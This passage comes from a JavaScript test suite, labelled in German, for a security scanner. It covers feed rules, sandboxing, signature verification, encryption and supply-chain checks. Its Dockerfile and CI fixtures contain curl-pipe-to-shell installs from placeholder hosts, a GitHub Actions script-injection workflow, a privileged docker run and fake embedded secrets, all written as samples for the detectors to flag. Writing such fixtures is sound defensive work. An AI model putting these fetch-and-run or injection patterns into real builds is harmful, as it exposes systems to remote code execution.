    const toml = ['title = "gitleaks"', ...Array.from({ length: 60 }, (_, i) => `[[rules]]\nid = "demo-${i}"\ndescription = "Demo Token ${i}"\nregex = '''(?i)\\b(demo${i}_[a-z0-9]{20})\\b'''\nkeywords = ["demo${i}_"]\n`), '[[rules]]\nid = "github-pat"\ndescription = "GitHub Personal Access Token"\nregex = \'\'\'ghp_[0-9a-zA-Z]{36}\'\'\'\nkeywords = ["ghp_"]\n[[rules.allowlists]]\nregexes = [\'\'\'x\'\'\']'].join('\n');
    const repo = Object.fromEntries(Array.from({ length: 25 }, (_, i) => [`lib${i}`, { vulnerabilities: [{ below: '2.0.0', severity: 'high', identifiers: { CVE: [`CVE-2020-000${i}`], summary: 'XSS' } }], extractors: { filename: [`lib${i}-(§§version§§)(.min)?\\.js`], filecontent: [`/\\*! lib${i} v(§§version§§)`] } }]));
    const fake = (bodies) => async (url) => { const b = bodies[url]; if (b instanceof Error) throw b; return { ok: b !== undefined, status: b === undefined ? 404 : 200, arrayBuffer: async () => Buffer.from(b) }; };
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-feeds-'));
    const urls = { [feeds.FEEDS[0].urls[0]]: toml, [feeds.FEEDS[1].urls[0]]: JSON.stringify(repo) };
    const r1 = await feeds.syncFeeds(dir, { fetchImpl: fake(urls) });
    check('feeds: beide Quellen geladen und geprüft', r1.slice(0, 2).every((x) => x.ok) && r1[0].count === 61 && r1[1].count === 25);
    const r2 = await feeds.syncFeeds(dir, { fetchImpl: fake({}) });
    check('feeds: frische Daten werden nicht erneut geladen', r2.slice(0, 2).every((x) => x.skipped));
    const r3 = await feeds.syncFeeds(dir, { force: true, fetchImpl: fake({ [feeds.FEEDS[0].urls[0]]: 'kaputt', [feeds.FEEDS[1].urls[0]]: new Error('offline'), [feeds.FEEDS[1].urls[1]]: new Error('offline') }) });
    const st = feeds.feedStatus(dir);
    check('feeds: fehlerhafte Quelle – letzte gute Fassung bleibt aktiv', r3.slice(0, 2).every((x) => !x.ok) && st[0].count === 61 && /Format unerwartet/.test(st[0].lastError) && st[1].count === 25);
    check('feeds: nur erlaubte HTTPS-Quellen', feeds.FEEDS.every((f) => f.tool || f.urls.every((u) => u.startsWith('https://') && feeds.ALLOWED.some((a) => u.startsWith(a)))));
    const c = feeds.loadCompiled(dir);
    check('feeds: Go-Regex nach JavaScript übersetzt', c.secretRules.length === 61 && c.secretRules[0].re.flags.includes('i') && feeds.goRegexToJs('(?P<k>a)\\z').source === '(?<k>a)$' && feeds.goRegexToJs('\\p{L}+') === null);
    const sec = fscan.scanSecretsWithFeed([{ label: 'p/a.js', content: 'x = "DEMO7_abcdefghij0123456789"\ny = "ghp_' + 'A'.repeat(18) + 'b'.repeat(18) + '"\nz = "demo3_example_example_ex"' }], c.secretRules);
    check('feeds: Zugangsdaten mit neuen Regeln gefunden, Beispielwerte ignoriert', sec.length === 2 && sec.some((f) => f.ruleId === 'gl-demo-7' && f.location === 'p/a.js:1') && sec.some((f) => f.ruleId === 'gl-github-pat' && f.severity === 'critical'));
    const libs = fscan.scanJsLibs([{ label: 'p/vendor/lib4-1.9.2.min.js', content: '' }, { label: 'p/x.js', content: '/*! lib5 v2.1.0 */' }], c.retire);
    check('feeds: verwundbare Bibliothek per Dateiname, aktuelle Version still', libs.length === 1 && /lib4 1\.9\.2 \(CVE-2020-0004\)/.test(libs[0].title) && libs[0].package.fixed === '2.0.0');
    check('feeds: Skripte einer Webseite geprüft', fscan.scanScriptUris(['https://cdn.example/lib9-1.0.0.js'], c.retire, 'https://x').length === 1);
    check('feeds: Versionsvergleich', fscan.cmpVer('1.10.0', '1.9.9') > 0 && fscan.cmpVer('2.0.0-beta', '2.0.0') < 0 && fscan.cmpVer('3.4.1', '3.4.1') === 0);
    fs.rmSync(dir, { recursive: true, force: true });
  }

  // --- Korrekturen aus der Code-Pruefung ---
  {
    const AdmZip = require('adm-zip');
    const http = require('http');
    const { analyzeDocument } = require('../src/core/docaudit');
    const { runDeepWeb } = require('../src/core/modules/webdeep');
    const z = new AdmZip(); z.addFile('word/document.xml', Buffer.from('<w:document/>'));
    z.addFile('word/_rels/document.xml.rels', Buffer.from('<Relationships><Relationship Id="r1" Type="http://x/hyperlink" Target="https://example.org/" TargetMode="External"/><Relationship Id="r2" Type="http://x/oleObject" Target="embeddings/oleObject1.bin"/></Relationships>'));
    check('dokument: Link plus lokales Objekt ist kein Nachladen', !analyzeDocument(z.toBuffer(), 'a.docx').some((f) => f.ruleId === 'doc-remote-template'));
    check('dokument: leere oder winzige Datei wirft keinen Fehler', analyzeDocument(Buffer.alloc(2), 'leer.doc').length === 0 && analyzeDocument(Buffer.alloc(0), 'leer.pdf').length === 0);
    // Anmeldeformular, das an einen fremden Host sendet
    const site = http.createServer((req, res) => {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(req.url.startsWith('/login') ? '<form method="post" action="https://idp.example.invalid/auth"><input name="email"><input type="password" name="password"></form>' : '<a href="/login">Login</a>');
    });
    await new Promise((r) => site.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${site.address().port}/`;
    const off = await runDeepWeb(base, { deep: true, rps: 200, login: { loginUrl: base + 'login', username: 'a@b.c', password: 'x' } });
    check('login: Testkonto geht nie an einen fremden Host', /anderen Host/.test(off.notes.join(' ')) && !off.ran.includes('web-login'));
    site.close();
    const down = await runDeepWeb('http://127.0.0.1:9/', { deep: true, rps: 200 });
    check('web: nicht erreichbare Seite gilt nicht als geprüft (keine falsche Behebung)', !down.ran.includes('web-crawl') && !down.ran.includes('web-probe') && /nicht erreichbar/.test(down.notes.join(' ')));
    const { toHtml } = require('../src/core/reportdoc');
    const html = toHtml({ findings: [{ title: 'Behobenes Problem', severity: 'critical', status: 'RESOLVED', category: 'Other', location: 'x' }, { title: 'Offenes Problem', severity: 'low', status: 'OPEN', category: 'Other', location: 'y' }], meta: {} });
    check('bericht: behobene Befunde zählen nicht als offen', !html.includes('Behobenes Problem') && html.includes('Offenes Problem'));
  }

  // --- Englische Befundtexte und Berichte ---
  {
    const path = require('path');
    const i18n = require('../src/core/findings-i18n');
    const { localizeReportHtml, localizeReportMd } = require('../src/core/report-en');
    const { ingestTargets } = require('../src/core/ingest');
    const { prescan } = require('../src/core/prescan');
    const { runStaticModules } = require('../src/core/modules/static');
    const { dedupeFindings, sortFindings, summarize } = require('../src/core/schema');
    const { enrichRemedy } = require('../src/core/remedies');
    const ing = await ingestTargets([{ type: 'path', value: path.join(__dirname, '..', 'bench', 'vulnerable-app') }]);
    const all = sortFindings(dedupeFindings([...prescan(ing.units, {}).findings, ...runStaticModules(ing.units).findings]).map(enrichRemedy));
    const GER = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich)\b/;
    const en = all.map(i18n.localizeFinding);
    const left = en.flatMap((f) => [f.title, f.description, f.impact, f.remediation, f.explanation, ...(f.steps || [])]).filter((t) => t && GER.test(t));
    check('englisch: alle Befundtexte des Übungsprojekts übersetzt', left.length === 0, left.slice(0, 2).join(' | '));
    check('englisch: eingesetzte Namen bleiben erhalten', i18n.translate('Container läuft privilegiert („shop“)') === 'Container runs privileged („shop“)');
    check('englisch: Unbekanntes bleibt unverändert', i18n.translate('Völlig unbekannter Satz ohne Eintrag.') === 'Völlig unbekannter Satz ohne Eintrag.');
    check('englisch: Aufzählungen und Leerzeichen am Rand', i18n.translate(' Er startet Programme, lädt Dateien aus dem Internet.') === ' It launches programs, downloads files from the internet.', i18n.translate(' Er startet Programme, lädt Dateien aus dem Internet.'));
    check('englisch: Original-Befund bleibt deutsch', all.some((f, i) => f.title !== en[i].title) && GER.test(all.map((f) => f.description).join(' ')));
    const report = require('../src/core/report');
    const res = i18n.localizeResult({ findings: all, summary: summarize(all), errors: [], meta: { at: '2026-11-02T10:00:00Z', units: 3 } });
    const html = localizeReportHtml(report.toHtml(res, {}));
    check('englisch: Bericht (HTML) ohne deutsche Überschriften', /lang="en"/.test(html) && /Findings in detail/.test(html) && !/Befunde im Detail|Auf einen Blick|Nachweise für Normen/.test(html));
    const md0 = report.toMarkdown(res, {});
    const md = localizeReportMd(md0);
    check('englisch: Bericht (Markdown) übersetzt', /^# Security report/m.test(md) && /\*\*What is wrong\?\*\*/.test(md) && !/Was ist los\?|Lösung:/.test(md));
    check('englisch: Code-Blöcke im Bericht bleiben unverändert', md0.split('```').filter((x, i) => i % 2).join() === md.split('```').filter((x, i) => i % 2).join());
  }

  // --- Selbstschutz: Sandbox, Download-Pruefung, Verschluesselung, App-Sperre, Selbst-Scan ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path'); const crypto = require('crypto');
    // Sandbox fuer externe Werkzeuge
    const sb = require('../src/core/sandbox');
    const env = sb.minimalEnv({ PATH: 'C:\\Windows', SystemRoot: 'C:\\Windows', ANTHROPIC_API_KEY: 'sk-ant-x', OPENAI_API_KEY: 'sk-x', GITHUB_TOKEN: 'ghp_x', AWS_SECRET_ACCESS_KEY: 'a', TRIVY_CACHE_DIR: 'C:\\c', SEMGREP_APP_TOKEN: 't', HTTPS_PROXY: 'http://user:pw@proxy:3128', RANDOM_VAR: 'x' });
    check('sandbox: Umgebung ohne Schlüssel und Tokens', !env.ANTHROPIC_API_KEY && !env.OPENAI_API_KEY && !env.GITHUB_TOKEN && !env.AWS_SECRET_ACCESS_KEY && !env.SEMGREP_APP_TOKEN && !env.RANDOM_VAR);
    check('sandbox: nötige Variablen bleiben, Proxy ohne Zugangsdaten', env.PATH === 'C:\\Windows' && env.SystemRoot && env.TRIVY_CACHE_DIR === 'C:\\c' && env.HTTPS_PROXY === 'http://proxy:3128/');
    const tdir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-sb-'));
    check('sandbox: Arbeitsordner = Ziel bzw. Temp-Ordner', sb.targetCwd(['scan', tdir]) === tdir && sb.targetCwd(['-u', 'https://x.example']) === os.tmpdir());
    let seen = null;
    const fakeSpawn = (cmd, args, opts) => { seen = { cmd, args, opts }; const { EventEmitter } = require('events'); const c = new EventEmitter(); c.stdout = new EventEmitter(); c.stderr = new EventEmitter(); c.kill = () => { c.killed = true; setImmediate(() => c.emit('close', null)); }; setImmediate(() => { c.stdout.emit('data', Buffer.alloc(3000, 65)); c.stdout.emit('data', Buffer.alloc(3000, 66)); }); return c; };
    const r = await sb.runSandboxed('tool', ['scan', tdir], { spawnImpl: fakeSpawn, maxBytes: 4096, timeoutMs: 5000 });
    check('sandbox: keine Shell, Ausgabe begrenzt, Prozess beendet', seen.opts.shell === false && seen.opts.cwd === tdir && !('ANTHROPIC_API_KEY' in seen.opts.env) && r.truncated && r.stdout.length === 4096);
    const r2 = await sb.runSandboxed('tool', ['a\0b'], { spawnImpl: fakeSpawn });
    const r3 = await sb.runSandboxed('tool', ['x'], { spawnImpl: (c, a, o) => { const { EventEmitter } = require('events'); const ch = new EventEmitter(); ch.stdout = new EventEmitter(); ch.stderr = new EventEmitter(); ch.kill = () => setImmediate(() => ch.emit('close', null)); return ch; }, timeoutMs: 30 });
    check('sandbox: ungültige Argumente abgelehnt, Zeitlimit greift', !r2.ok && r3.timedOut);
    const real = await sb.runSandboxed(process.execPath, ['-e', 'process.stdout.write(String(!!process.env.VIGIL_SB_SECRET_TOKEN))'], { timeoutMs: 20000 });
    process.env.VIGIL_SB_SECRET_TOKEN = 'x';
    const real2 = await sb.runSandboxed(process.execPath, ['-e', 'process.stdout.write(String(!!process.env.VIGIL_SB_SECRET_TOKEN))'], { timeoutMs: 20000 });
    delete process.env.VIGIL_SB_SECRET_TOKEN;
    check('sandbox: echter Prozess sieht keine Geheimnisse', real.ok && real.stdout === 'false' && real2.stdout === 'false');
    fs.rmSync(tdir, { recursive: true, force: true });

    // Download-Pruefung: SHA-256-Pinning und minisign
    const vf = require('../src/core/verify');
    const payload = Buffer.from('feed-data');
    check('verify: SHA-256-Pin passt / Abweichung wird abgelehnt', vf.verifySha256(payload, vf.sha256(payload)).pinned && (() => { try { vf.verifySha256(payload, 'ab'.repeat(32)); return false; } catch { return true; } })());
    const { publicKey, privateKey } = crypto.generateKeyPairSync('ed25519');
    const keyId = crypto.randomBytes(8);
    const pubRaw = Buffer.from(publicKey.export({ format: 'jwk' }).x, 'base64url');
    const pubText = 'untrusted comment: minisign public key\n' + Buffer.concat([Buffer.from('Ed'), keyId, pubRaw]).toString('base64') + '\n';
    const mkSig = (data, alg = 'ED', comment = 'timestamp:1') => {
      const msg = alg === 'ED' ? crypto.createHash('blake2b512').update(data).digest() : data;
      const sig = crypto.sign(null, msg, privateKey);
      const glob = crypto.sign(null, Buffer.concat([sig, Buffer.from(comment)]), privateKey);
      return `untrusted comment: sig\n${Buffer.concat([Buffer.from(alg), keyId, sig]).toString('base64')}\ntrusted comment: ${comment}\n${glob.toString('base64')}\n`;
    };
    const throws = (fn) => { try { fn(); return false; } catch { return true; } };
    check('verify: minisign (vorgehasht und klassisch) gültig', vf.verifyMinisign(payload, mkSig(payload), pubText).ok && vf.verifyMinisign(payload, mkSig(payload, 'Ed'), pubText).trustedComment === 'timestamp:1');
    const tampered = mkSig(payload).split('\n'); tampered[2] = 'trusted comment: timestamp:2';
    check('verify: veränderte Datei, Kommentar oder fremder Schlüssel abgelehnt', throws(() => vf.verifyMinisign(Buffer.from('other'), mkSig(payload), pubText)) && throws(() => vf.verifyMinisign(payload, tampered.join('\n'), pubText)) && throws(() => vf.verifyMinisign(payload, mkSig(payload).replace(/^(untrusted comment: sig\n)(\S+)/, (m, a, b) => { const x = Buffer.from(b, 'base64'); x[3] ^= 1; return a + x.toString('base64'); }), pubText)));
    // Feeds: Pins und Integritaet im Cache
    const feeds = require('../src/core/feeds');
    const toml = Array.from({ length: 55 }, (_, i) => `[[rules]]\nid = "r${i}"\nregex = '''x${i}_[a-z]{9}'''\n`).join('\n');
    const repo = JSON.stringify(Object.fromEntries(Array.from({ length: 22 }, (_, i) => [`l${i}`, { vulnerabilities: [{ below: '1.0.0' }], extractors: { filename: [`l${i}-(§§version§§).js`] } }])));
    const fake = (bodies) => async (url) => ({ ok: bodies[url] !== undefined, status: bodies[url] === undefined ? 404 : 200, arrayBuffer: async () => Buffer.from(bodies[url] || '') });
    const fdir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-pins-'));
    const bodies = { [feeds.FEEDS[0].urls[0]]: toml, [feeds.FEEDS[1].urls[0]]: repo };
    fs.writeFileSync(path.join(fdir, 'pins.json'), JSON.stringify({ 'gitleaks-rules': { sha256: ['00'.repeat(32)] }, retirejs: { sha256: [vf.sha256(Buffer.from(repo))] } }));
    const pr = await feeds.syncFeeds(fdir, { fetchImpl: fake(bodies) });
    check('verify: Feed mit falschem Pin abgelehnt, passender übernommen', !pr[0].ok && /SHA-256/.test(pr[0].error) && pr[1].ok && feeds.loadFeed(fdir, 'retirejs').pinned === true);
    const ff = path.join(fdir, 'retirejs.json'); const rec = JSON.parse(fs.readFileSync(ff, 'utf8')); rec.data.l0.vulnerabilities[0].below = '9.9.9'; fs.writeFileSync(ff, JSON.stringify(rec));
    check('verify: veränderter Feed im Cache wird nicht verwendet', feeds.loadFeed(fdir, 'retirejs') === null && feeds.needsFeedSync(fdir));
    fs.rmSync(fdir, { recursive: true, force: true });

    // Verschluesselung im Ruhezustand
    const sf = require('../src/core/securefile');
    const st = require('../src/core/store');
    const edir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-enc-'));
    const fakeSafe = { isEncryptionAvailable: () => true, encryptString: (s) => Buffer.from('W' + Buffer.from(s).toString('hex')), decryptString: (b) => Buffer.from(String(b).slice(1), 'hex').toString() };
    const cipher = sf.loadOrCreateKey(path.join(edir, 'data.key'), fakeSafe);
    const cipher2 = sf.loadOrCreateKey(path.join(edir, 'data.key'), fakeSafe);
    const blob = cipher.encrypt('{"a":1}');
    check('verschlüsselung: AES-256-GCM Hin und zurück, Schlüssel bleibt gleich', sf.isEncrypted(blob) && cipher2.decrypt(blob).toString() === '{"a":1}' && !blob.includes(Buffer.from('"a"')));
    const bad = Buffer.from(blob); bad[bad.length - 1] ^= 1;
    check('verschlüsselung: Manipulation wird erkannt', throws(() => cipher.decrypt(bad)));
    check('verschlüsselung: ohne Schlüsselverwaltung kein Schlüssel', sf.loadOrCreateKey(path.join(edir, 'x.key'), { isEncryptionAvailable: () => false }) === null);
    const sfile = path.join(edir, 'findings-store.json');
    const plain = st.emptyStore(); plain.findings.abc = { id: 'abc', title: 'Geheimer Befund', status: 'OPEN', severity: 'high' };
    fs.writeFileSync(sfile, JSON.stringify(plain));
    st.setCipher(cipher);
    const migrated = st.load(sfile);
    const onDisk = fs.readFileSync(sfile);
    check('verschlüsselung: Klartext-Speicher wird beim Laden migriert', migrated.findings.abc.title === 'Geheimer Befund' && sf.isEncrypted(onDisk) && !onDisk.includes(Buffer.from('Geheimer')));
    migrated.findings.def = { id: 'def', title: 'Zweiter', status: 'OPEN', severity: 'low' };
    st.save(sfile, migrated);
    check('verschlüsselung: Speichern und Laden (verschlüsselt)', Object.keys(st.load(sfile).findings).length === 2);
    st.setCipher(sf.createCipher(crypto.randomBytes(32)));
    const wrong = st.load(sfile);
    const kept = fs.readdirSync(edir).filter((f) => f.startsWith('findings-store.json.unreadable-'));
    check('verschlüsselung: falscher Schlüssel überschreibt nichts (Datei gesichert)', Object.keys(wrong.findings).length === 0 && kept.length === 1 && sf.isEncrypted(fs.readFileSync(path.join(edir, kept[0]))));
    st.setCipher(null);
    const hdir = path.join(edir, 'history'); fs.mkdirSync(hdir); fs.writeFileSync(path.join(hdir, 'r1.json'), '{"findings":[]}');
    check('verschlüsselung: Verlauf-Ordner migriert', sf.migrateDir(hdir, cipher) === 1 && sf.readJson(path.join(hdir, 'r1.json'), cipher).encrypted && sf.migrateDir(hdir, cipher) === 0);
    fs.rmSync(edir, { recursive: true, force: true });

    // App-Sperre
    const al = require('../src/core/applock');
    const rec2 = al.hashPassword('richtig-123');
    check('app-sperre: scrypt-Hash, richtiges und falsches Passwort', rec2.algo === 'scrypt' && !JSON.stringify(rec2).includes('richtig') && al.verifyPassword('richtig-123', rec2) && !al.verifyPassword('falsch-123', rec2));
    let t = 1000;
    const ls = al.createLockState({ now: () => t });
    ls.lock();
    for (let i = 0; i < 5; i++) ls.attempt('nope', rec2);
    const blocked = ls.attempt('richtig-123', rec2);
    t += 5 * 60 * 1000;
    const after = ls.attempt('richtig-123', rec2);
    check('app-sperre: nach 5 Fehlversuchen Wartezeit, danach entsperrt', !blocked.ok && blocked.waitMs > 0 && after.ok && !ls.isLocked());
    check('app-sperre: Einstellungen normalisiert', al.normalizeSettings({ enabled: true }).enabled === false && al.normalizeSettings({ idleMinutes: 9999 }).idleMinutes === 240 && al.validateNewPassword('kurz') && !al.validateNewPassword('lang-genug'));

    // Visuelle Regression: PNG-Kodierung und Vergleich
    const png = require('./visual/png');
    const img = { width: 4, height: 3, data: Buffer.alloc(48, 120) };
    const back = png.decode(png.encode(img));
    const img2 = { width: 4, height: 3, data: Buffer.from(img.data) }; img2.data[0] = 250;
    check('visuell: PNG hin und zurück, Pixel-Unterschied mit Toleranz', back.width === 4 && back.data.equals(img.data) && png.compare(img, img2).diffPixels === 1 && png.compare(img, back).diffPixels === 0);

    // Selbst-Scan: Vigils eigene Pruefungen auf Vigils eigenen Code
    const { ingestTargets } = require('../src/core/ingest');
    const { prescan } = require('../src/core/prescan');
    const { runStaticModules } = require('../src/core/modules/static');
    const { dedupeFindings } = require('../src/core/schema');
    const self = await ingestTargets([{ type: 'path', value: path.join(__dirname, '..', 'src') }, { type: 'path', value: path.join(__dirname, '..', 'electron') }]);
    const selfF = dedupeFindings([...prescan(self.units, {}).findings, ...runStaticModules(self.units).findings]);
    const crit = selfF.filter((f) => f.severity === 'critical');
    // Regel-Definitionen enthalten die gesuchten Muster selbst (z. B. "jwt.decode(") – das sind keine Luecken
    const RULE_FILES = /modules[\\/](static|langs|iac|mobile|webdeep|cryptoinv)\.js|prescan\.js|findings-en\.js|remedies\.js/;
    const high = selfF.filter((f) => f.severity === 'high' && !RULE_FILES.test(f.location));
    check(`selbst-scan: keine kritischen Befunde in Vigils eigenem Code (${self.units.length} Dateien)`, self.units.length > 40 && crit.length === 0);
    check('selbst-scan: keine hohen Befunde außerhalb der Regel-Dateien', high.length === 0);
    // Electron-Grundhaertung im Hauptfenster
    const mainSrc = fs.readFileSync(path.join(__dirname, '..', 'electron', 'main.js'), 'utf8');
    const html = fs.readFileSync(path.join(__dirname, '..', 'src', 'ui', 'index.html'), 'utf8');
    check('selbst-scan: Fenster mit Sandbox, Kontext-Isolation, ohne Node', /contextIsolation:\s*true/.test(mainSrc) && /nodeIntegration:\s*false/.test(mainSrc) && /sandbox:\s*true/.test(mainSrc) && !/webSecurity:\s*false/.test(mainSrc));
    check('selbst-scan: strenge CSP ohne unsafe-eval und Fremdquellen', /default-src 'none'/.test(html) && /object-src 'none'/.test(html) && !/unsafe-eval/.test(html) && !/script-src[^;]*(https?:|\*)/.test(html));
    const cfgB = require('../electron-builder.config.js');
    check('selbst-scan: Electron-Fuses im Build gesetzt', cfgB.electronFuses && cfgB.electronFuses.runAsNode === false && cfgB.electronFuses.enableNodeOptionsEnvironmentVariable === false && cfgB.electronFuses.onlyLoadAppFromAsar && cfgB.electronFuses.enableEmbeddedAsarIntegrityValidation);
    check('selbst-scan: externe Werkzeuge nur über die Sandbox', !/require\('child_process'\)/.test(fs.readFileSync(path.join(__dirname, '..', 'src', 'core', 'tools.js'), 'utf8')));
  }

  // --- Lieferkette, Container und CI (Lockfile, Dockerfile, Actions, GitLab/Azure/Jenkins, CMS, deps.dev, Schadpakete, Live-Schlüssel, Schichten, Helm, SBOM) ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path'); const zlib = require('zlib');
    const sup = require('../src/core/modules/supply');
    const cmsM = require('../src/core/modules/cms');
    const i18n = require('../src/core/findings-i18n');
    const all = [];
    const keep = (arr) => { all.push(...arr); return arr; };
    const ids = (arr) => arr.map((f) => f.ruleId).sort().join(',');
    const json = (body, status = 200) => ({ ok: status >= 200 && status < 300, status, json: async () => body, text: async () => JSON.stringify(body) });

    // lockdrift
    const pj = JSON.stringify({ dependencies: { express: '^4.18.0', lodash: '^4.17.21' }, devDependencies: { jest: '^29.0.0' } });
    const lockOk = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { express: '^4.18.0', lodash: '^4.17.21' }, devDependencies: { jest: '^29.0.0' } } } });
    const lockBad = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { express: '^4.17.0', 'left-pad': '1.0.0' }, devDependencies: { jest: '^29.0.0' } } } });
    const d1 = keep(sup.lockDrift([{ label: 'p/package.json', content: pj }, { label: 'p/package-lock.json', content: lockBad }]));
    check('lockdrift: npm – fehlend, abweichend, überzählig', d1.length === 1 && d1[0].ruleId === 'lockfile-drift' && /lodash/.test(d1[0].description) && /express \(\^4\.18\.0 ≠ \^4\.17\.0\)/.test(d1[0].description) && /left-pad/.test(d1[0].description) && d1[0].location === 'p/package-lock.json');
    check('lockdrift: npm – passendes Lockfile bleibt still', sup.lockDrift([{ label: 'p/package.json', content: pj }, { label: 'p/package-lock.json', content: lockOk }]).length === 0);
    check('lockdrift: Dateien aus verschiedenen Ordnern werden nicht verglichen', sup.lockDrift([{ label: 'a/package.json', content: pj }, { label: 'b/package-lock.json', content: lockBad }]).length === 0);
    const pyp = '[tool.poetry.dependencies]\npython = "^3.11"\nrequests = "^2.31"\nFlask = "^3.0"\n';
    const d2 = keep(sup.lockDrift([{ label: 'py/pyproject.toml', content: pyp }, { label: 'py/poetry.lock', content: '[[package]]\nname = "requests"\nversion = "2.31.0"\n' }]));
    check('lockdrift: Poetry – fehlendes Paket erkannt', d2.length === 1 && /Flask/.test(d2[0].description) && !/python/.test(d2[0].description.split('Fehlt im Lockfile:')[1]));
    check('lockdrift: Poetry – vollständiges Lockfile still', sup.lockDrift([{ label: 'py/pyproject.toml', content: pyp }, { label: 'py/poetry.lock', content: '[[package]]\nname = "requests"\n[[package]]\nname = "flask"\n' }]).length === 0);
    const d3 = keep(sup.lockDrift([{ label: 'pe/Pipfile', content: '[packages]\nrequests = "*"\n\n[dev-packages]\npytest = "*"\n' }, { label: 'pe/Pipfile.lock', content: JSON.stringify({ default: { requests: {} }, develop: {} }) }]));
    check('lockdrift: Pipenv – Dev-Paket fehlt im Lockfile', d3.length === 1 && /pytest/.test(d3[0].description));
    check('lockdrift: Pipenv – vollständig still', sup.lockDrift([{ label: 'pe/Pipfile', content: '[packages]\nrequests = "*"\n' }, { label: 'pe/Pipfile.lock', content: JSON.stringify({ default: { requests: {} }, develop: {} }) }]).length === 0);
    const gemLock = 'GEM\n  remote: https://rubygems.org/\n  specs:\n    rails (7.0.0)\n\nDEPENDENCIES\n  rails (~> 7.0)\n  sidekiq\n\nBUNDLED WITH\n   2.4.0\n';
    const d4 = keep(sup.lockDrift([{ label: 'rb/Gemfile', content: "source 'https://rubygems.org'\ngem 'rails', '~> 7.0'\ngem 'puma'\n" }, { label: 'rb/Gemfile.lock', content: gemLock }]));
    check('lockdrift: Bundler – fehlend und überzählig', d4.length === 1 && /puma/.test(d4[0].description) && /sidekiq/.test(d4[0].description));
    check('lockdrift: Bundler – passend still', sup.lockDrift([{ label: 'rb/Gemfile', content: "gem 'rails'\ngem 'sidekiq'\n" }, { label: 'rb/Gemfile.lock', content: gemLock }]).length === 0);

    // dockerfile2
    const df = 'FROM node:20\nADD https://example.com/tool.tar.gz /opt/\nRUN apt-get update && \\\n    curl -fsSL https://get.example.sh | bash\nARG NPM_TOKEN\nENV DB_PASSWORD=Sup3rS3cretValue\nENV API_KEY_FILE=/run/secrets/key\nUSER app\n';
    const dd = keep(sup.dockerfile([{ label: 'svc/Dockerfile', content: df }]));
    const envF = dd.find((f) => f.ruleId === 'docker-secret-env');
    check('dockerfile: ADD-URL, curl|bash, ARG/ENV-Geheimnis, fehlender HEALTHCHECK', ids(dd) === 'docker-add-url,docker-curl-pipe-sh,docker-no-healthcheck,docker-secret-arg,docker-secret-env' && dd.find((f) => f.ruleId === 'docker-curl-pipe-sh').location === 'svc/Dockerfile:3' && dd.find((f) => f.ruleId === 'docker-no-healthcheck').severity === 'info');
    check('dockerfile: Geheimnis nur geschwärzt, Verweis auf Datei kein Fund', envF.severity === 'high' && !JSON.stringify(dd).includes('Sup3rS3cretValue') && !dd.some((f) => /API_KEY_FILE/.test(f.title)));
    check('dockerfile: sauberes Dockerfile bleibt still', sup.dockerfile([{ label: 'Dockerfile', content: 'FROM node:20\nCOPY . /app\nADD --checksum=sha256:abc https://example.com/y.tgz /y\nHEALTHCHECK CMD curl -f http://localhost/ || exit 1\nENV NODE_ENV=production\nENV TOKEN_URL=https://auth.example.com\n' }]).length === 0);

    // gha2
    const wf = 'name: ci\non:\n  issues:\n  pull_request:\npermissions:\n  contents: read\n  id-token: write\njobs:\n  t:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: |\n          echo "${{ github.event.issue.title }}"\n';
    const gh = keep(sup.githubActions([{ label: '.github/workflows/ci.yml', content: wf }]));
    check('actions: Script-Injection, unnötiges id-token, Self-hosted bei PRs', ids(gh) === 'gha-script-injection,gha-self-hosted-pr,gha-unneeded-id-token' && gh.find((f) => f.ruleId === 'gha-script-injection').location === '.github/workflows/ci.yml:13' && gh.find((f) => f.ruleId === 'gha-unneeded-id-token').location === '.github/workflows/ci.yml:7');
    const wfOk = 'on: push\npermissions: read-all\njobs:\n  t:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - uses: aws-actions/configure-aws-credentials@0123456789abcdef0123456789abcdef01234567\n      - env:\n          TITLE: ${{ github.event.issue.title }}\n        run: echo "$TITLE"\n';
    check('actions: Wert über env, OIDC-Nutzung und push-Runner still', sup.githubActions([{ label: '.github/workflows/ok.yml', content: wfOk }]).length === 0);
    const noPerm = keep(sup.githubActions([{ label: '.github/workflows/b.yml', content: 'on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' }]));
    check('actions: fehlende permissions gemeldet', ids(noPerm) === 'gha-missing-permissions');

    // ci-other
    const gl = 'image: node:latest\nvariables:\n  DEPLOY_TOKEN: "glpat-q7Wm2Xr9Lk4Pz8Vn"\n  SAFE_TOKEN: $CI_JOB_TOKEN\ninclude:\n  - remote: https://example.com/ci.yml\n  - project: group/templates\n    file: /ci.yml\nservices:\n  - docker:24-dind\nbuild:\n  script:\n    - curl -sL https://x.example/install.sh | sh\n';
    const glF = keep(sup.ciOther([{ label: '.gitlab-ci.yml', content: gl }]));
    check('gitlab: Klartext-Token, :latest, remote/unpinned include, dind, curl|sh', ids(glF) === 'ci-curl-pipe-sh,ci-docker-dind,ci-image-latest,ci-include-remote,ci-include-unpinned,ci-plaintext-secret' && !JSON.stringify(glF).includes('glpat-q7Wm2Xr9Lk4Pz8Vn'));
    check('gitlab: gepinnt und über Variablen still', sup.ciOther([{ label: '.gitlab-ci.yml', content: `image: node:20@sha256:${'a'.repeat(64)}\nvariables:\n  DEPLOY_TOKEN: $VAULT_TOKEN\ninclude:\n  - project: group/templates\n    ref: ${'b'.repeat(40)}\n    file: /ci.yml\n` }]).length === 0);
    const az = "pool:\n  vmImage: ubuntu-latest\nvariables:\n  - name: API_KEY\n    value: 'q7Wm2Xr9Lk4Pz8Vn'\nresources:\n  repositories:\n    - repository: templates\n      type: github\n      name: org/templates\nsteps:\n  - script: docker run --privileged myimg:1.0\n";
    const azF = keep(sup.ciOther([{ label: 'azure-pipelines.yml', content: az }]));
